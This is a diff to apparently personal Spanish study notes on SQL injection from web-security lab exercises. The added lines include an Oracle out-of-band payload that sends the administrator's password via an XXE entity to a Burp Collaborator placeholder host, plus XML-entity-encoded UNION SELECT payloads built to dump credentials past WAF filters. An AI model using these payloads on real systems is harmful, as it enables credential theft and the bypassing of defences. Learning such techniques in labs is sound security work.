@@ -279,7 +279,30 @@ Habiendo confirmado una forma de desencadenar interacciones out-of-band, podemos
 Esta input lee la contrasenia del usuario Administrador, anexiona un subdominio Collaborator unico y desencadena un DNS lookup. Este lookup permite ver la contrasenia capturada:  
 `S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net`  
 Las tecnicas Out-of-band (OAST (Out of band Application Security Testing)) son una muy poderosa forma de detectar y explotar vulnerabilidades de inyeccion SQL ciega, dada la alta chance de exito y la posibilidad de exfiltrar datos de forma directa mediante el canal out-of-band. Por esta razon, las tecnicas OAST son usualmente preferibles incluso en situaciones en las que otras tecnicas para explotar vulnerabilidades ciegas podrian funcionar.  
-#Nota: hay varias formas de provocar una interaccion out-of-band, y tecnicas diferentes aplican en diferentes tipos de bases de datos.
+#Nota: hay varias formas de provocar una interaccion out-of-band, y tecnicas diferentes aplican en diferentes tipos de bases de datos. Tener en cuenta que depende de cada tipo de base.  
+Otro ejemplo: `'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`  
+CLick derecho y inser collaborator payload en burp collaborator subdomain.
+
+### Inyecciones SQL en contextos variables
+Se pueden hacer inyecciones SQL usando cualquier input controlable que sea procesado como un query SQL por la aplicacion, por ejemplo JSON o XML usado en una query de la base. Estos formatos proveen formas diferentes de ofuscar los ataques que serian de otra forma bloqueados por los WAFs y otros mecanismos de defensa.  
+Las implementaciones debiles usualmente buscan palabras comunes en inyecciones SQL en el request, asi que podria ser posible bypasear estos filtros encodeando o usando caracteres de escape en las keywords prohibidas. Por ejemplo, la siguiente inyeccion SQL basada en XML usa una secuencia de escape XML para encodear el caracter `S` en `SELECT`:  
+`<stockCheck>  
+    <productId>123</productId>  
+    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>  
+</stockCheck>`  
+Esto sera decodificado en el servidor antes de pasar al interprete SQL.
+Extension hackvertor usada para encodear. Selecciono lo que quiero encodear  y le doy click a la forma en que quiero encodearlo, por ejemplo hex_entities... nose.  
+Ejemplo:  
+`<?xml version="1.0" encoding="UTF-8"?>
+  <stockCheck>
+    <productId>
+      2
+    </productId>
+    <storeId>
+      <@dec_entities>1  UNION SELECT username || '~' || password FROM users<@/dec_entities>
+    </storeId>
+  </stockCheck>`
+
 
 ## John the Ripper
 
@@ -298,6 +321,14 @@ Las tecnicas Out-of-band (OAST (Out of band Application Security Testing)) son u
 (TBD - Información por agregar)
 
 ## Sqlmap
+
+(TBD - Información por agregar)
+
+## Nikto
+
+(TBD - Información por agregar)
+
+## Hydra
 
 (TBD - Información por agregar)
 
